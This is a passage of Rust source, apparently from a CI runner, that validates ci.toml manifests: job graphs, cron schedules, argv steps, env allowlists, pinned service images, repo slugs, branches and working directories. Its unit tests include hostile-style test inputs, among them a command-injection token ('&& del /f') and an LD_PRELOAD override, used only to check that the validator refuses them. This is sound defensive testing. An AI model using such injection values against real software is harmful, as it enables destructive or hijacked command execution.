fn topological_order(mut pending: Vec<CiJob>) -> Result<Vec<CiJob>, String> {
    let mut ordered: Vec<CiJob> = Vec::with_capacity(pending.len());
    while !pending.is_empty() {
        let ready = pending.iter().position(|j| {
            j.needs
                .iter()
                .all(|n| ordered.iter().any(|done| &done.name == n))
        });
        match ready {
            Some(i) => ordered.push(pending.remove(i)),
            None => {
                let names: Vec<&str> = pending.iter().map(|j| j.name.as_str()).collect();
                return Err(format!(
                    "ci.toml [[jobs]] needs form a cycle among {names:?}"
                ));
            }
        }
    }
    Ok(ordered)
}

/// `^[a-z0-9][a-z0-9-]{0,47}$`. Tight on purpose: the name becomes a GitHub
/// check-run context and a CLI argument.
fn validate_job_name(name: &str) -> Result<(), String> {
    let ok = !name.is_empty()
        && name.len() <= 48
        && name
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
        && name
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
    if ok {
        Ok(())
    } else {
        Err(format!(
            "name {name:?} must match ^[a-z0-9][a-z0-9-]{{0,47}}$ (it becomes a check-run context \
             and a CLI argument)"
        ))
    }
}

/// A 5-field cron expression (minute hour day-of-month month day-of-week), UTC.
/// Each field is a comma list of `*`, `N` or `N-M`, each optionally `/STEP`,
/// with every number inside the field's range. Names (`MON`, `JAN`) and the
/// `@daily` shorthands are refused: one spelling, checked here, is what coord
/// evaluates.
fn validate_cron(expr: &str) -> Result<(), String> {
    const FIELDS: [(&str, u32, u32); 5] = [
        ("minute", 0, 59),
        ("hour", 0, 23),
        ("day-of-month", 1, 31),
        ("month", 1, 12),
        ("day-of-week", 0, 7),
    ];
    let parts: Vec<&str> = expr.split_whitespace().collect();
    if parts.len() != FIELDS.len() {
        return Err(format!(
            "must have exactly 5 fields (minute hour day-of-month month day-of-week), found {}",
            parts.len()
        ));
    }
    for (field, (what, lo, hi)) in parts.iter().zip(FIELDS) {
        for item in field.split(',') {
            let (range, step) = match item.split_once('/') {
                Some((r, s)) => (r, Some(s)),
                None => (item, None),
            };
            if let Some(step) = step {
                match step.parse::<u32>() {
                    Ok(n) if n >= 1 && n <= hi => {}
                    _ => return Err(format!("{what} step {step:?} must be 1..={hi}")),
                }
            }
            if range == "*" {
                continue;
            }
            let (a, b) = match range.split_once('-') {
                Some((a, b)) => (a, Some(b)),
                None => (range, None),
            };
            let num = |t: &str| -> Result<u32, String> {
                match t.parse::<u32>() {
                    Ok(n) if (lo..=hi).contains(&n) => Ok(n),
                    _ => Err(format!(
                        "{what} value {t:?} must be a number in {lo}..={hi}"
                    )),
                }
            };
            let start = num(a)?;
            if let Some(b) = b {
                let end = num(b)?;
                if end < start {
                    return Err(format!("{what} range {range:?} runs backwards"));
                }
            }
        }
    }
    Ok(())
}

/// The per-step rules, applied to every step of every job. `scope` prefixes
/// each label (`"job 'test' "` in v2, empty in v1), so an error names the job.
fn validate_steps(steps: &[CiStep], scope: &str) -> Result<(), String> {
    let mut seen_names: Vec<&str> = Vec::new();
    for (i, step) in steps.iter().enumerate() {
        let label = if step.name.trim().is_empty() {
            format!("{scope}steps[{i}]")
        } else {
            format!("{scope}step '{}'", step.name)
        };
        if step.name.trim().is_empty() {
            return Err(format!("{label}: name must be non-empty"));
        }
        if seen_names.contains(&step.name.as_str()) {
            return Err(format!(
                "{label}: declared twice — step names must be unique within a job (they key the \
                 result summary)"
            ));
        }
        seen_names.push(&step.name);
        if step.command.is_empty() || step.command[0].trim().is_empty() {
            return Err(format!("{label}: command must be a non-empty argv array"));
        }
        for token in &step.command {
            if token.contains(ARGV_BANNED_CHARS) {
                return Err(format!(
                    "{label}: command token {token:?} contains a banned shell metacharacter"
                ));
            }
        }
        for key in step.env.keys() {
            if let Some((_, owner)) = EXECUTOR_OWNED_ENV
                .iter()
                .find(|(owned, _)| *owned == key.as_str())
            {
                return Err(format!(
                    "{label}: env var {key:?} is exported by the executor and would be \
                     overridden — set {owner} instead"
                ));
            }
            if let Some(kind) = crate::services::kind_exporting(key.as_str()) {
                // A connection variable a manifest could only ever get wrong:
                // the host port is assigned at dispatch time and the password
                // is generated per dispatch. Hardcoding one would point the
                // dispatch at whatever database happens to be running on the
                // contributor's machine — the exact "a step that assumed a
                // local Postgres" failure this lane exists to avoid.
                return Err(format!(
                    "{label}: env var {key:?} is exported by the executor from the [[services]] \
                     entry that provides it (service kind '{}') — declare that service instead \
                     of hardcoding a connection",
                    kind.label()
                ));
            }
            if !ENV_ALLOWLIST.contains(&key.as_str()) {
                return Err(format!(
                    "{label}: env var {key:?} is not allowlisted (allowed: {ENV_ALLOWLIST:?})"
                ));
            }
        }
        if let Some(t) = step.timeout_secs {
            if t == 0 || t > MAX_STEP_TIMEOUT_SECS {
                return Err(format!(
                    "{label}: timeout_secs {t} out of range (1..={MAX_STEP_TIMEOUT_SECS})"
                ));
            }
        }
        if let Some(wd) = &step.working_dir {
            validate_working_dir(wd).map_err(|e| format!("{label}: {e}"))?;
        }
    }
    Ok(())
}

fn validate_siblings(siblings: &[CiSibling]) -> Result<(), String> {
    if siblings.len() > MAX_PROVISIONED_ENTRIES {
        return Err(format!(
            "ci.toml declares {} [[siblings]] (max {MAX_PROVISIONED_ENTRIES})",
            siblings.len()
        ));
    }
    let mut seen_dirs: Vec<&str> = Vec::new();
    for s in siblings {
        let label = format!("sibling '{}'", s.repo);
        validate_sibling_repo(&s.repo).map_err(|e| format!("{label}: {e}"))?;
        validate_branch(&s.branch).map_err(|e| format!("{label}: {e}"))?;
        let dir = s.dir_name();
        if seen_dirs.contains(&dir) {
            // Two siblings landing on one directory: the second would hit the
            // "destination already exists" refusal at materialise time, which
            // is a confusing way to report an authoring mistake.
            return Err(format!(
                "{label}: two [[siblings]] resolve to the same directory {dir:?}"
            ));
        }
        seen_dirs.push(dir);
    }
    Ok(())
}

/// The toolchains a `[canonical]` requirement may name — exactly the keys a
/// host's convergence machinery can drive a version manager for. The runner's
/// `env_agent` is the machinery today, and a test there pins this list equal
/// to its `APPLIABLE_TOOLS`, so the two cannot drift: a key here that no
/// machine can converge would validate and then be unsatisfiable everywhere.
pub const CANONICAL_TOOLCHAINS: &[&str] = &["node", "python", "rustc"];

/// Validate the `[canonical]` requirement against [`CANONICAL_TOOLCHAINS`].
fn validate_canonical(canonical: Option<&CiCanonical>) -> Result<(), String> {
    let Some(c) = canonical else {
        return Ok(());
    };
    // An empty list is refused rather than treated as "no requirement". A
    // present-but-empty `[canonical]` reads to its author as a declaration; if
    // it silently meant nothing, a repo could believe it was gated when it was
    // not — a vacuous requirement, which is this lane's recurring defect shape.
    if c.toolchains.is_empty() {
        return Err(format!(
            "[canonical]: declares no toolchains. Name the toolchains this build requires the \
             box to be at canonical for (any of: {}), or remove the [canonical] table — an \
             empty requirement gates nothing",
            CANONICAL_TOOLCHAINS.join(", ")
        ));
    }
    let mut seen: Vec<&str> = Vec::new();
    for name in &c.toolchains {
        if !CANONICAL_TOOLCHAINS.contains(&name.as_str()) {
            return Err(format!(
                "[canonical]: '{name}' is not a convergeable toolchain (known: \
                 {CANONICAL_TOOLCHAINS:?}). Only keys a host has a version-manager cascade for \
                 can be required"
            ));
        }
        if seen.contains(&name.as_str()) {
            return Err(format!("[canonical]: toolchain '{name}' declared twice"));
        }
        seen.push(name);
    }
    Ok(())
}

fn validate_tools(tools: &[CiTool]) -> Result<(), String> {
    if tools.len() > MAX_PROVISIONED_ENTRIES {
        return Err(format!(
            "ci.toml declares {} [[tools]] (max {MAX_PROVISIONED_ENTRIES})",
            tools.len()
        ));
    }
    let mut seen: Vec<&str> = Vec::new();
    for t in tools {
        let label = format!("tool '{}'", t.name);
        if crate::tools::lookup(&t.name).is_none() {
            return Err(format!(
                "{label}: unknown tool. This runner provisions from a closed registry \
                 (known: {:?}) — a manifest names a tool, it never supplies a URL",
                crate::tools::known_tool_names()
            ));
        }
        validate_tool_version(&t.version).map_err(|e| format!("{label}: {e}"))?;
        if seen.contains(&t.name.as_str()) {
            return Err(format!("{label}: declared twice"));
        }
        seen.push(&t.name);
    }
    Ok(())
}

fn validate_services(services: &[CiService]) -> Result<(), String> {
    if services.len() > MAX_PROVISIONED_ENTRIES {
        return Err(format!(
            "ci.toml declares {} [[services]] (max {MAX_PROVISIONED_ENTRIES})",
            services.len()
        ));
    }
    let mut seen_names: Vec<&str> = Vec::new();
    let mut seen_kinds: Vec<crate::services::ServiceKind> = Vec::new();
    for s in services {
        let label = format!("service '{}'", s.name);
        let Some(spec) = crate::services::lookup(&s.name) else {
            return Err(format!(
                "{label}: unknown service. This runner starts services from a closed registry \
                 (known: {:?}) — a manifest names a service, it never supplies an image",
                crate::services::known_service_names()
            ));
        };
        validate_image_tag(&s.version).map_err(|e| format!("{label}: {e}"))?;
        if let Some(d) = &s.digest {
            validate_image_digest(d).map_err(|e| format!("{label}: {e}"))?;
        }
        if seen_names.contains(&s.name.as_str()) {
            return Err(format!("{label}: declared twice"));
        }
        seen_names.push(&s.name);
        if seen_kinds.contains(&spec.kind) {
            // Two of a kind would export the SAME connection variables, so a
            // step could not tell them apart and one would silently win.
            // Caught here rather than as a confusing "your DATABASE_URL points
            // at the other one" at run time.
            return Err(format!(
                "{label}: two [[services]] provide the same connection env (kind '{}') — \
                 a step could not tell them apart",
                spec.kind.label()
            ));
        }
        seen_kinds.push(spec.kind);
    }
    Ok(())
}

/// An image tag becomes half of an image reference, so it is restricted to
/// what a registry actually accepts AND required to name a version. The
/// version rule is the same one `[[tools]]` enforces, for the same reason:
/// a floating pointer makes two dispatches of one commit incomparable.
fn validate_image_tag(tag: &str) -> Result<(), String> {
    if tag.is_empty() || tag.len() > 128 {
        return Err(format!("version {tag:?} must be 1..=128 chars"));
    }
    if !tag.starts_with(|c: char| c.is_ascii_alphanumeric()) {
        return Err(format!(
            "version {tag:?} must start with a letter or digit (a registry tag cannot begin \
             with '.' or '-')"
        ));
    }
    if !tag
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        return Err(format!("version {tag:?} may only contain [A-Za-z0-9._-]"));
    }
    // A tag that carries no digit is a moving alias, not a version:
    // `latest`, `stable`, `alpine`, `bookworm`. `pg16` and `7-alpine` are
    // versions. The named list below is redundant with that rule and kept
    // anyway, because the error it produces is the one an author needs.
    const FLOATING: &[&str] = &[
        "latest", "stable", "edge", "main", "master", "nightly", "dev", "current", "rolling",
        "release",
    ];
    if FLOATING.iter().any(|f| tag.eq_ignore_ascii_case(f))
        || !tag.contains(|c: char| c.is_ascii_digit())
    {
        return Err(format!(
            "version {tag:?} is a floating tag, not a pinned image version — pin one that names \
             a version (e.g. \"pg16\", \"7-alpine\"). An unpinned image makes two dispatches of \
             the same commit incomparable, and for a true pin add digest = \"sha256:…\" (a tag \
             is a mutable pointer; a digest is not)"
        ));
    }
    Ok(())
}

/// `sha256:` plus exactly 64 lowercase hex digits — the only shape a registry
/// digest takes, and the one thing in a service declaration that cannot be
/// re-pointed under the dispatch.
fn validate_image_digest(digest: &str) -> Result<(), String> {
    let Some(hex) = digest.strip_prefix("sha256:") else {
        return Err(format!(
            "digest {digest:?} must be of the form \"sha256:<64 hex digits>\""
        ));
    };
    if hex.len() != 64
        || !hex
            .chars()
            .all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
    {
        return Err(format!(
            "digest {digest:?} must be \"sha256:\" followed by exactly 64 lowercase hex digits"
        ));
    }
    Ok(())
}

/// `owner/name`, both segments non-empty and made of the characters GitHub
/// actually allows in an owner/repo. Stricter than the argv metacharacter
/// rule because this value is interpolated into a clone URL and into a
/// filesystem path.
fn validate_sibling_repo(repo: &str) -> Result<(), String> {
    if repo.len() > 200 {
        return Err("repo slug too long".to_string());
    }
    let mut parts = repo.split('/');
    let (Some(owner), Some(name), None) = (parts.next(), parts.next(), parts.next()) else {
        return Err(format!(
            "repo {repo:?} must be exactly `owner/name` (the owner is required — it becomes a clone URL)"
        ));
    };
    for seg in [owner, name] {
        if seg.is_empty() || seg == "." || seg == ".." || seg.starts_with('-') {
            return Err(format!("repo {repo:?} has an invalid path segment {seg:?}"));
        }
        if !seg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        {
            return Err(format!("repo {repo:?} has an invalid path segment {seg:?}"));
        }
    }
    Ok(())
}

/// A git branch name safe to hand to `git ls-remote` as an explicit refspec.
/// Leading `-` is rejected so the value can never be read as an option.
fn validate_branch(branch: &str) -> Result<(), String> {
    if branch.is_empty() || branch.len() > 200 {
        return Err(format!("branch {branch:?} must be 1..=200 chars"));
    }
    if branch.starts_with('-') || branch.starts_with('/') || branch.ends_with('/') {
        return Err(format!(
            "branch {branch:?} has an invalid leading/trailing character"
        ));
    }
    if branch.contains("..") || branch.contains("//") || branch.contains("@{") {
        return Err(format!("branch {branch:?} contains a forbidden sequence"));
    }
    if !branch
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
    {
        return Err(format!(
            "branch {branch:?} may only contain [A-Za-z0-9._/-]"
        ));
    }
    Ok(())
}

/// A tool version becomes both a URL path segment and a cache directory
/// name, so it is restricted to what a semver-ish release tag can contain and
/// must start with a digit (which also rejects `latest`).
fn validate_tool_version(version: &str) -> Result<(), String> {
    if version.is_empty() || version.len() > 64 {
        return Err(format!("version {version:?} must be 1..=64 chars"));
    }
    if !version.starts_with(|c: char| c.is_ascii_digit()) {
        return Err(format!(
            "version {version:?} must be an exact version starting with a digit \
             (a floating version like \"latest\" makes two dispatches of one commit \
             incomparable, and the version is the cache key)"
        ));
    }
    if version.contains("..") {
        return Err(format!("version {version:?} contains a forbidden sequence"));
    }
    if !version
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+'))
    {
        return Err(format!(
            "version {version:?} may only contain [A-Za-z0-9._+-]"
        ));
    }
    Ok(())
}

/// Structural check that a working_dir stays inside the worktree: relative,
/// no parent/root/prefix components. Execution additionally canonicalizes
/// and prefix-checks against the real worktree path.
fn validate_working_dir(wd: &str) -> Result<(), String> {
    let path = std::path::Path::new(wd);
    // The `:` check rejects Windows drive-qualified paths (`C:\x`, `C:x`)
    // even when this code runs on a non-Windows host (cross-platform tests).
    if path.is_absolute() || wd.starts_with('/') || wd.starts_with('\\') || wd.contains(':') {
        return Err(format!("working_dir {wd:?} must be repo-relative"));
    }
    for component in path.components() {
        match component {
            std::path::Component::Normal(_) | std::path::Component::CurDir => {}
            _ => {
                return Err(format!(
                    "working_dir {wd:?} must not contain parent/root components"
                ))
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A host large enough that no host cap binds, so limits tests read as
    /// statements about the MANIFEST value.
    const BIG_HOST: HostSizing = HostSizing {
        cargo_build_jobs: 32,
        test_threads: 32,
    };
    /// A host so small every cap binds.
    const TINY_HOST: HostSizing = HostSizing {
        cargo_build_jobs: 1,
        test_threads: 2,
    };

    const VALID: &str = r#"
version = 1

[limits]
cargo_build_jobs = 1

[[steps]]
name = "fmt"
command = ["cargo", "fmt", "--", "--check"]
working_dir = "src-tauri"

[[steps]]
name = "test"
command = ["cargo", "test"]
working_dir = "src-tauri"
env = { QONTINUI_DISABLE_KEYCHAIN = "1" }
timeout_secs = 7200
"#;

    /// The `[canonical]` requirement, and the closed set it validates against.
    #[test]
    fn canonical_declares_a_closed_set_of_toolchains() {
        let m = parse_and_validate(&format!(
            "{VALID}
[canonical]
toolchains = [\"rustc\", \"node\"]
"
        ))
        .expect("a canonical block naming real toolchains must parse");
        let c = m.canonical.expect("[canonical] must survive parsing");
        assert_eq!(c.toolchains, vec!["rustc".to_string(), "node".to_string()]);

        // Absent is the default and means no claim — NOT an empty claim.
        let plain = parse_and_validate(VALID).expect("valid");
        assert!(plain.canonical.is_none());
    }

    /// The known-set is `env_agent`'s, not a second list. A key the convergence
    /// machinery has no manager cascade for must not be declarable, or a repo
    /// could commit a requirement no machine could ever satisfy.
    #[test]
    fn an_unconvergeable_toolchain_is_refused() {
        let err = parse_and_validate(&format!(
            "{VALID}
[canonical]
toolchains = [\"deno\"]
"
        ))
        .expect_err("deno has no version-manager cascade");
        assert!(err.contains("not a convergeable toolchain"), "{err}");
        // The message must name what IS available, the way the tool registry's
        // refusal quotes `known_tool_names()`.
        assert!(err.contains("rustc"), "{err}");
    }

    /// An empty list is refused rather than treated as "no requirement": it
    /// reads to its author as a declaration, and a declaration that gates
    /// nothing is this lane's recurring defect.
    #[test]
    fn an_empty_canonical_block_is_refused_not_ignored() {
        let err = parse_and_validate(&format!(
            "{VALID}
[canonical]
toolchains = []
"
        ))
        .expect_err("an empty requirement must not pass as 'no requirement'");
        assert!(err.contains("declares no toolchains"), "{err}");
    }

    #[test]
    fn a_toolchain_declared_twice_is_refused() {
        let err = parse_and_validate(&format!(
            "{VALID}
[canonical]
toolchains = [\"node\", \"node\"]
"
        ))
        .expect_err("duplicates are a manifest mistake, not a doubled requirement");
        assert!(err.contains("declared twice"), "{err}");
    }

    /// `deny_unknown_fields` is what makes the land order load-bearing: a
    /// manifest carrying `[canonical]` is a HARD PARSE ERROR on a runner that
    /// predates this phase, exactly as `[[tools]]`/`[[siblings]]` were before
    /// theirs. Runner rolls out first; manifests declaring it land after.
    #[test]
    fn an_unknown_key_inside_canonical_is_a_hard_parse_error() {
        let err = parse_and_validate(&format!(
            "{VALID}
[canonical]
toolchains = [\"node\"]
required = true
"
        ))
        .expect_err("deny_unknown_fields must reject a key this runner does not know");
        assert!(err.to_lowercase().contains("required"), "{err}");
    }

    #[test]
    fn valid_manifest_parses() {
        let m = parse_and_validate(VALID).expect("valid manifest must parse");
        assert_eq!(m.schema_version, 1);
        assert_eq!(m.jobs[0].steps.len(), 2);
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 1);
        assert_eq!(
            m.jobs[0].steps[0].effective_timeout_secs(),
            DEFAULT_STEP_TIMEOUT_SECS
        );
        assert_eq!(m.jobs[0].steps[1].effective_timeout_secs(), 7200);
        assert!(m.siblings.is_empty());
        assert!(m.tools.is_empty());
    }

    #[test]
    fn empty_steps_rejected() {
        let err = parse_and_validate("version = 1\nsteps = []\n").unwrap_err();
        assert!(err.contains("no [[steps]]"), "got: {err}");
    }

    #[test]
    fn unsupported_version_rejected() {
        let err =
            parse_and_validate("version = 3\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\n")
                .unwrap_err();
        assert!(err.contains("version 3 unsupported"), "got: {err}");
        assert!(err.contains("version = 1 and version = 2"), "got: {err}");
    }

    /// Version 2 is now SUPPORTED — this flips the old pin that refused it.
    /// But v2 does not accept the v1 shape: top-level steps are refused with a
    /// pointer to where they go, never silently merged into a job.
    #[test]
    fn version_2_refuses_top_level_steps_and_services_with_a_pointer() {
        let err =
            parse_and_validate("version = 2\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\n")
                .unwrap_err();
        assert!(err.contains("[[jobs.steps]]"), "got: {err}");
        let err = parse_and_validate(&format!(
            "{V2}\n[[services]]\nname = \"redis\"\nversion = \"7-alpine\"\n"
        ))
        .unwrap_err();
        assert!(err.contains("[[jobs.services]]"), "got: {err}");
        let err = parse_and_validate("version = 2\n").unwrap_err();
        assert!(err.contains("no [[jobs]]"), "got: {err}");
    }

    /// `[[jobs]]` belongs to v2; under v1 it is refused rather than ignored.
    #[test]
    fn jobs_under_version_1_are_refused() {
        let err = parse_and_validate(&V2.replace("version = 2", "version = 1")).unwrap_err();
        assert!(err.contains("need version = 2"), "got: {err}");
    }

    const V2: &str = r#"
version = 2

[limits]
cargo_build_jobs = 2

[[siblings]]
repo = "qontinui/qontinui-schemas"

[[jobs]]
name = "lint"
[[jobs.steps]]
name = "fmt"
command = ["cargo", "fmt", "--check"]

[[jobs]]
name = "test"
os = ["linux", "windows"]
needs = ["lint"]
limits = { cargo_build_jobs = 1 }
[[jobs.steps]]
name = "build"
command = ["cargo", "build"]
[[jobs.steps]]
name = "test"
command = ["cargo", "test"]
[[jobs.services]]
name = "redis"
version = "7-alpine"

[[jobs]]
name = "nightly"
os = "linux"
schedule = "17 3 * * 1-5"
[[jobs.steps]]
name = "fmt"
command = ["cargo", "fmt", "--check"]
"#;

    /// A v1 manifest reads as exactly one job named `ci` that carries the
    /// top-level steps and services and runs anywhere.
    #[test]
    fn v1_reads_as_one_job_named_ci() {
        let m = parse_and_validate(&format!(
            "{VALID}\n[[services]]\nname = \"redis\"\nversion = \"7-alpine\"\n"
        ))
        .expect("valid");
        assert_eq!(m.schema_version, 1);
        assert_eq!(m.jobs.len(), 1);
        let job = &m.jobs[0];
        assert_eq!(job.name, crate::dispatch::DEFAULT_JOB);
        assert_eq!(job.os, vec![Os::Any]);
        assert!(job.needs.is_empty() && job.schedule.is_none() && job.limits.is_none());
        assert_eq!(job.steps.len(), 2);
        assert_eq!(job.services.len(), 1);
        assert!(m.job("ci").is_some());
        assert_eq!(job.check_contexts(), vec!["qontinui-ci / ci".to_string()]);
    }

    /// The v2 shape: per-job os/needs/schedule/services/limits, top-level
    /// siblings and limits, and every job reachable by name.
    #[test]
    fn v2_jobs_parse_with_their_per_job_fields() {
        let m = parse_and_validate(V2).expect("valid v2");
        assert_eq!(m.schema_version, 2);
        let names: Vec<&str> = m.jobs.iter().map(|j| j.name.as_str()).collect();
        assert_eq!(names, ["lint", "test", "nightly"]);
        assert_eq!(m.siblings.len(), 1, "siblings stay top-level");

        let test = m.job("test").unwrap();
        assert_eq!(test.os, vec![Os::Linux, Os::Windows]);
        assert_eq!(test.needs, vec!["lint".to_string()]);
        assert_eq!(test.services.len(), 1);
        assert_eq!(
            m.limits_for(test).cargo_build_jobs,
            Some(1),
            "job limits win"
        );
        assert!(test.runs_on(Some(Os::Windows)) && !test.runs_on(Some(Os::Macos)));
        assert!(
            !test.runs_on(None),
            "a named-OS job never runs on an unknown OS"
        );
        assert_eq!(
            test.check_contexts(),
            vec![
                "qontinui-ci / test (linux)".to_string(),
                "qontinui-ci / test (windows)".to_string()
            ]
        );

        let lint = m.job("lint").unwrap();
        assert_eq!(
            m.limits_for(lint).cargo_build_jobs,
            Some(2),
            "top limits inherited"
        );
        assert!(lint.runs_on(Some(Os::Macos)), "os defaults to any");
        assert!(
            lint.runs_on(None),
            "`any` matches even an unrecognised host OS"
        );

        // The scheduled job is not a gate job.
        let gates: Vec<&str> = m.gate_jobs().map(|j| j.name.as_str()).collect();
        assert_eq!(gates, ["lint", "test"]);
        assert_eq!(
            m.job("nightly").unwrap().schedule.as_deref(),
            Some("17 3 * * 1-5")
        );
    }

    /// Jobs come out topologically ordered by `needs`, declaration order among
    /// peers.
    #[test]
    fn jobs_are_topologically_ordered() {
        let m = parse_and_validate(
            r#"
version = 2
[[jobs]]
name = "c"
needs = ["b"]
[[jobs.steps]]
name = "s"
command = ["true"]
[[jobs]]
name = "a"
[[jobs.steps]]
name = "s"
command = ["true"]
[[jobs]]
name = "b"
needs = ["a"]
[[jobs.steps]]
name = "s"
command = ["true"]
"#,
        )
        .expect("valid");
        let names: Vec<&str> = m.jobs.iter().map(|j| j.name.as_str()).collect();
        assert_eq!(names, ["a", "b", "c"]);
    }

    fn two_jobs(a_extra: &str, b_extra: &str) -> String {
        format!(
            "version = 2\n[[jobs]]\nname = \"a\"\n{a_extra}\n[[jobs.steps]]\nname = \"s\"\n\
             command = [\"true\"]\n[[jobs]]\nname = \"b\"\n{b_extra}\n[[jobs.steps]]\n\
             name = \"s\"\ncommand = [\"true\"]\n"
        )
    }

    #[test]
    fn job_graph_errors_are_refused() {
        let cases: [(String, &str); 6] = [
            (two_jobs("needs = [\"b\"]", "needs = [\"a\"]"), "cycle"),
            (two_jobs("needs = [\"a\"]", ""), "needs itself"),
            (
                two_jobs("needs = [\"zzz\"]", ""),
                "not a job in this manifest",
            ),
            (two_jobs("needs = [\"b\", \"b\"]", ""), "twice"),
            (
                two_jobs("needs = [\"b\"]", "schedule = \"0 0 * * *\""),
                "runs only on its schedule",
            ),
            (
                two_jobs("", "").replace("name = \"b\"", "name = \"a\""),
                "declared twice",
            ),
        ];
        for (text, want) in cases {
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains(want), "want {want:?}, got: {err}");
        }
        // A scheduled job MAY need another scheduled job, or an unscheduled one.
        parse_and_validate(&two_jobs("schedule = \"0 0 * * *\"\nneeds = [\"b\"]", ""))
            .expect("a scheduled job may need a gate job");
    }

    #[test]
    fn job_names_follow_the_check_context_grammar() {
        for bad in [
            "",
            "Test",
            "-lead",
            "has space",
            "under_score",
            &"x".repeat(49),
        ] {
            let text = two_jobs("", "").replace("name = \"a\"", &format!("name = {bad:?}"));
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("must match"), "{bad:?}: got {err}");
        }
        for good in ["0", "rust-test", &"x".repeat(48)] {
            let text = two_jobs("", "").replace("name = \"a\"", &format!("name = {good:?}"));
            parse_and_validate(&text).unwrap_or_else(|e| panic!("{good:?}: {e}"));
        }
    }

    #[test]
    fn os_specs_are_validated() {
        for (os, want) in [
            ("os = []", "names no OS"),
            ("os = [\"linux\", \"linux\"]", "listed twice"),
            ("os = [\"any\", \"linux\"]", "cannot be listed beside"),
            ("os = \"solaris\"", "parse error"),
        ] {
            let err = parse_and_validate(&two_jobs(os, "")).unwrap_err();
            assert!(err.contains(want), "{os}: got {err}");
        }
    }

    #[test]
    fn cron_schedules_are_validated() {
        for good in ["* * * * *", "*/15 0-6 1,15 1-12/2 0-7", "59 23 31 12 7"] {
            validate_cron(good).unwrap_or_else(|e| panic!("{good:?}: {e}"));
        }
        for bad in [
            "* * * *",
            "* * * * * *",
            "60 * * * *",
            "* 24 * * *",
            "* * 0 * *",
            "* * * 13 *",
            "* * * * 8",
            "5-1 * * * *",
            "*/0 * * * *",
            "@daily",
            "* * * JAN *",
        ] {
            assert!(validate_cron(bad).is_err(), "{bad:?} must be refused");
        }
        let err = parse_and_validate(&two_jobs("schedule = \"61 * * * *\"", "")).unwrap_err();
        assert!(err.contains("job 'a': schedule"), "got: {err}");
    }

    /// Per-step rules run on every job's steps, and the error names the job.
    /// Step names are unique within a job, but two jobs may reuse one.
    #[test]
    fn v2_step_rules_apply_per_job() {
        let dup = two_jobs("", "").replace(
            "name = \"a\"\n\n[[jobs.steps]]\nname = \"s\"\ncommand = [\"true\"]\n",
            "name = \"a\"\n\n[[jobs.steps]]\nname = \"s\"\ncommand = [\"true\"]\n[[jobs.steps]]\nname = \"s\"\ncommand = [\"true\"]\n",
        );
        let err = parse_and_validate(&dup).unwrap_err();
        assert!(
            err.contains("job 'a' step 's': declared twice"),
            "got: {err}"
        );

        let bad_env = two_jobs("", "").replace(
            "name = \"b\"\n\n[[jobs.steps]]\nname = \"s\"\ncommand = [\"true\"]\n",
            "name = \"b\"\n\n[[jobs.steps]]\nname = \"s\"\ncommand = [\"true\"]\nenv = { PATH = \"/x\" }\n",
        );
        let err = parse_and_validate(&bad_env).unwrap_err();
        assert!(
            err.contains("job 'b' step 's'") && err.contains("not allowlisted"),
            "got: {err}"
        );

        let empty = "version = 2\n[[jobs]]\nname = \"a\"\nsteps = []\n";
        assert!(parse_and_validate(empty)
            .unwrap_err()
            .contains("nothing to run"));
    }

    #[test]
    fn unknown_fields_rejected() {
        let err = parse_and_validate(
            "version = 1\nsurprise = true\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("parse error"), "got: {err}");
        let err = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nshell = true\n",
        )
        .unwrap_err();
        assert!(err.contains("parse error"), "got: {err}");
    }

    #[test]
    fn non_array_command_rejected() {
        // A shell-string command is a TYPE error under the argv contract.
        let err =
            parse_and_validate("version = 1\n[[steps]]\nname = \"x\"\ncommand = \"cargo test\"\n")
                .unwrap_err();
        assert!(err.contains("parse error"), "got: {err}");
    }

    #[test]
    fn empty_command_rejected() {
        let err =
            parse_and_validate("version = 1\n[[steps]]\nname = \"x\"\ncommand = []\n").unwrap_err();
        assert!(err.contains("non-empty argv"), "got: {err}");
    }

    #[test]
    fn shell_metacharacters_in_argv_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"cargo\", \"test\", \"&& del /f\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("banned shell metacharacter"), "got: {err}");
    }

    #[test]
    fn env_outside_allowlist_rejected() {
        for key in ["PATH", "CARGO_HOME", "RUSTUP_HOME", "LD_PRELOAD"] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"evil\" }}\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("not allowlisted"), "{key}: got {err}");
        }
    }

    /// The parity additions are ACCEPTED — each one is set by a live Actions
    /// gate step, and the point of widening the boundary was to let a
    /// manifest express what that step expresses.
    #[test]
    fn parity_env_additions_accepted() {
        for key in ["QONTINUI_ALLOW_NO_DB", "CARGO_PROFILE_TEST_DEBUG"] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"0\" }}\n"
            );
            parse_and_validate(&text)
                .unwrap_or_else(|e| panic!("{key} must be allowlisted, got: {e}"));
        }
    }

    /// Executor-owned knobs are rejected with a message naming the manifest
    /// key that actually controls them — NOT silently accepted and ignored.
    #[test]
    fn executor_owned_env_rejected_with_the_right_pointer() {
        for (key, expect) in [
            ("CARGO_BUILD_JOBS", "[limits].cargo_build_jobs"),
            ("RUST_TEST_THREADS", "[limits].test_threads"),
            ("NEXTEST_TEST_THREADS", "[limits].test_threads"),
